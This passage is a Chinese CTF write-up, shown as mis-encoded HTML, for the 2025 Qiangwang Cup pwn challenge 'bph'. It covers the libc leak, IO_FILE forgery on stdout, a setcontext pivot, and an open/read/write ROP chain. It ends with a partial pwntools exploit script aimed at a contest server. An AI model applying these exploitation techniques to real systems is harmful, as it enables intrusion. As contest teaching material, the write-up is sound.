</h3><p><a class="link" href="bph" >bph</a></p>
<h4 id="è§£é¢˜æ€è·¯-10">è§£é¢˜æ€è·¯
</h4><p>ä¸€å¼€å§‹çœ‹åˆ°æ²™ç®±ä¿æŠ¤ï¼Œç¦ç”¨opençš„ï¼Œæ²¡ç¦readã€writeï¼Œæˆ‘æ˜¯æƒ³ç€æ‰¾ä¸€æ‰¾flagæ–‡ä»¶æè¿°ç¬¦fdçš„ï¼Œçœ‹çœ‹flagæœ‰æ— äº‹å…ˆè¢«æ‰“å¼€ï¼Œç»“æœå‘ç°æ²¡æœ‰è¢«æ‰“å¼€ï¼Œå¯¼è‡´æµªè´¹äº†å¾ˆå¤šæ—¶é—´ã€‚</p>
<p>æµªè´¹å¤ªå¤šæ—¶é—´åœ¨ä»£ç å®¡è®¡ä¸Šä»¥è‡³äºçŸ¥é“ç¨‹åºçš„ç”¨é€”å´ä¸çŸ¥é“æ¼æ´&hellip;&hellip;</p>
<h5 id="å‰ç½®å‡†å¤‡">å‰ç½®å‡†å¤‡
</h5><p>æ­£ç¡®çš„æ•´ä½“æ€è·¯æ˜¯<strong>æ³„éœ² libc åŸºåœ°å€ â†’ æ§åˆ¶å †å†…å­˜ä¼ªé€  IO ç»“æ„ â†’ åˆ©ç”¨ IO æµæ¼æ´æˆ– setcontext åŠ«æŒæ‰§è¡Œæµ â†’ æ‰§è¡Œ ROP é“¾è¯»å– flag</strong>ã€‚</p>
<p>checksecæŸ¥çœ‹ä¿æŠ¤ä¿¡æ¯ï¼šå…¨å¼€ã€‚</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/25.png"
	width="690"
	height="174"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/25_hu_a3c7206a80d7b50c.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/25_hu_a35741980a14931d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="396"
		data-flex-basis="951px"
	
></p>
<p>æŸ¥çœ‹æ²™ç®±ä¿æŠ¤ä¿¡æ¯ï¼š</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/26.png"
	width="690"
	height="319"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/26_hu_f8c841633dec8ed2.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/26_hu_253613daf519e1b3.png 1024w"
	loading="lazy"
	
		alt="seccomp-tools"
	
	
		class="gallery-image" 
		data-flex-grow="216"
		data-flex-basis="519px"
	
></p>
<p>åœ¨IDAä¸Šè¿›è¡Œmainå‡½æ•°åˆ†æï¼ˆIDAç©ºé—´æœ‰é™ï¼Œæˆªå›¾æˆªä¸å…¨&hellip;ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">v4</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-68h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-40h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_16C0</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_1540</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_1640</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1) Create note&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2) Edit note&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;3) View note&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;4) Delete note&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;6) Exit&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">__printf_chk</span><span class="p">(</span><span class="mi">2LL</span><span class="p">,</span> <span class="s">&#34;Choice: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="nf">fgets</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_9</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;bad choice&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">__isoc23_strtol</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">10LL</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">1u</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_1810</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">2u</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_1930</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">3u</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">__printf_chk</span><span class="p">(</span><span class="mi">2LL</span><span class="p">,</span> <span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_1710</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">4u</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_1A50</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">6u</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;bye&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_9</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä» main å‡½æ•°åç¼–è¯‘ä»£ç å¯çŸ¥ï¼Œç¨‹åºæ˜¯ä¸€ä¸ªå…¸å‹çš„ &ldquo;ç¬”è®°ç®¡ç†ç³»ç»Ÿ&rdquo;ï¼Œæä¾›ä»¥ä¸‹åŠŸèƒ½ï¼š</p>
<ol>
<li>
<p>åˆ›å»ºç¬”è®°ï¼ˆCreate noteï¼‰</p>
</li>
<li>
<p>ç¼–è¾‘ç¬”è®°ï¼ˆEdit noteï¼‰</p>
</li>
<li>
<p>æŸ¥çœ‹ç¬”è®°ï¼ˆView noteï¼‰</p>
</li>
<li>
<p>åˆ é™¤ç¬”è®°ï¼ˆDelete noteï¼‰</p>
</li>
<li>
<p>é€€å‡ºï¼ˆExitï¼‰</p>
</li>
</ol>
<p>é‚£æˆ‘çš„åˆæ­¥æ€è·¯å¯èƒ½å°±æ˜¯ä»æ ˆæº¢å‡ºã€å †åˆ©ç”¨èµ·æ‰‹ï¼Œæœ‰æƒ³è¿‡UAFçš„ï¼Œä¸è¿‡è”ç³»ä¸å¤§å°±æ”¾å¼ƒè¿™ä¸ªæƒ³æ³•äº†ã€‚</p>
<blockquote>
<p>s.å¸ˆå‚…ä¸€å¼€å§‹æ˜¯ç”¨exitçš„ï¼Œä½†å› ä¸ºç”¨exitçš„æ—¶å€™ï¼Œè¿™ä¸ªputsä¼šè°ƒç”¨stdoutå¯¼è‡´æœ‰å¹²æ‰°ï¼Œåˆå› ä¸ºTaä¹‹å‰æŠŠio list allå’Œstdoutéƒ½æ”¹äº†ï¼Œç ´åäº†stdoutï¼Œåé¢ä¿®å¤äº†stdoutï¼Œè°ƒç”¨åˆ°äº†io clean upï¼Œåé¢æ²¡å†è°ƒäº†ï¼Œä¸€ç›´è°ƒä¸å‡ºæ¥&hellip;&hellip;</p>
</blockquote>
<h5 id="æ³„éœ²libcåŸºåœ°å€">æ³„éœ²libcåŸºåœ°å€
</h5><p>é€šè¿‡è¾“å…¥å‡½æ•°è§¦å‘å†…å­˜æ³„éœ²ï¼Œè·å– libc ä¸­free å‡½æ•°çš„æŒ‡é’ˆï¼Œscanf %s æ³„éœ²libcåœ°å€ï¼š</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/27.png"
	width="690"
	height="218"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/27_hu_bbcac9eca58ef5ec.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/27_hu_62e061f440a34d8a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="316"
		data-flex-basis="759px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># ä»æ³„éœ²çš„æ•°æ®ä¸­æå–freeå‡½æ•°æŒ‡é’ˆï¼ˆå‡å»åç§»126ä¿®æ­£ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">free_function_pointer_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mi">126</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç”¨freeå‡½æ•°åœ¨libcä¸­çš„åç§»è®¡ç®—åŸºåœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">free_function_pointer_address</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;free&#34;</span><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="ä¼ªé€ ioç»“æ„">ä¼ªé€ IOç»“æ„
</h5><p>addå‡½æ•°åˆ†æï¼š</p>
<p>add å¤„å¯å¯¼è‡´ä»»æ„åœ°å€å†™ä¸€å­—èŠ‚0  ï¼Œä¿®æ”¹stdinç»“æ„ä½“å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œä¿®æ”¹stdoutç»“æ„ä½“ï¼Œputsè§¦å‘io ï¼š</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/28.png"
	width="690"
	height="597"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/28_hu_7fe598cd2ab89886.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/28_hu_7def807fd488e078.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="115"
		data-flex-basis="277px"
	
></p>
<p>èµ·åˆæƒ³ç”¨ORWçš„ï¼Œä½†çœ‹åˆ°seccompçš„ä¸€äº›é™åˆ¶ï¼Œæ— æ³•ç›´æ¥è·å– shellï¼Œå› æ­¤æˆ‘å°è¯•é‡‡ç”¨ä¼ªé€  IO æµç»“æ„ä½“çš„æ–¹å¼æ§åˆ¶ç¨‹åºæµç¨‹ã€‚</p>
<p>åˆ©ç”¨å †æ“ä½œå°†ä¼ªé€ çš„_IO_FILEç»“æ„ä½“å†™å…¥å†…å­˜ã€åŠ«æŒæ ‡å‡†è¾“å‡ºæµï¼ˆ_IO_2_1_stdout_ï¼‰</p>
<p>æ„é€ çš„ä¼ªé€ ç»“æ„ä½“åŒ…å«setcontextç›¸å…³ gadget ï¼Œç„¶åè·³è½¬åˆ° ROP æ”»å‡»é“¾ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># ä¼ªé€ æ–‡ä»¶ç»“æ„ä½“åœ°å€ï¼ˆåŸºäºstdoutåœ°å€ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_file_structure_address</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="c1"># æ„é€ æ§åˆ¶IOæµçš„payload1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;setcontext&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">61</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span>  <span class="c1"># è·³è½¬</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>  <span class="c1"># ç•¥</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="æ„é€ ropæ”»å‡»é“¾">æ„é€ ROPæ”»å‡»é“¾
</h5><p>é€šè¿‡ä¼ªé€ çš„ IO ç»“æ„ä½“è§¦å‘ ROP é“¾ï¼Œå®Œæˆæ–‡ä»¶æ“ä½œã€‚</p>
<p><strong>1ã€æ‰“å¼€ Flag æ–‡ä»¶</strong>ï¼šä½¿ç”¨openç³»ç»Ÿè°ƒç”¨æ‰“å¼€/flagï¼ˆæ–‡ä»¶è·¯å¾„å­˜å‚¨åœ¨ ROP é“¾æœ«å°¾ï¼‰ã€‚</p>
<p><strong>2ã€è¯»å–æ–‡ä»¶å†…å®¹</strong>ï¼šå°† Flag å†…å®¹è¯»å–åˆ°<strong>IO_2_1_stdout</strong> + 0x300å¤„ï¼ˆlibc ä¸­çš„å¯æ§å†…å­˜ï¼‰ã€‚</p>
<p><strong>3ã€æ‹¿åˆ°flag</strong>ï¼šé€šè¿‡writeç³»ç»Ÿè°ƒç”¨å°†è¯»å–åˆ°çš„å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚</p>
<p>ROPé“¾ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload_ROP</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># æ‰“å¼€/flagï¼ˆåªè¯»æ¨¡å¼ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x204698</span><span class="p">)</span> <span class="o">+</span>  <span class="c1"># æ–‡ä»¶ååœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span>                    <span class="c1"># åªè¯»æ¨¡å¼</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;open&#39;</span><span class="p">])</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># è¯»å–å†…å®¹åˆ°å†…å­˜</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span>                    <span class="c1"># æ–‡ä»¶æè¿°ç¬¦ï¼ˆå‡è®¾ä¸º3ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x300</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">])</span> <span class="o">+</span>  <span class="c1"># å­˜å‚¨åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span>                 <span class="c1"># è¯»å–é•¿åº¦</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">])</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># è¾“å‡ºFlag</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span>                    <span class="c1"># æ ‡å‡†è¾“å‡º</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x300</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">])</span> <span class="o">+</span>  <span class="c1"># å†…å®¹åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span>                 <span class="c1"># è¾“å‡ºé•¿åº¦</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">])</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;/flag</span><span class="se">\x00</span><span class="s1">&#39;</span>                               <span class="c1"># æ–‡ä»¶å</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="å°ç»“">å°ç»“
</h5><p>ä¸€å¼€å§‹å‚»ä¹ä¹ç”¨æœ¬åœ°libcæ‰“PWNï¼Œæ‰“åŠå¤©æ²¡é€šï¼Œè¿˜æœ‰äº›å‡½æ•°æ‰¾ä¸åˆ°ï¼Œè¿™æ¬¡ç”¨äº† <a class="link" href="libc.so.6" >libc.so.6</a></p>
<h4 id="expflag-1">expã€flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;39.106.46.67&#39;</span><span class="p">,</span><span class="mi">26641</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x28</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;stop&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;stop&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free_function_pointer_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mi">126</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">free_function_pointer_address</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;free&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x203918</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> 
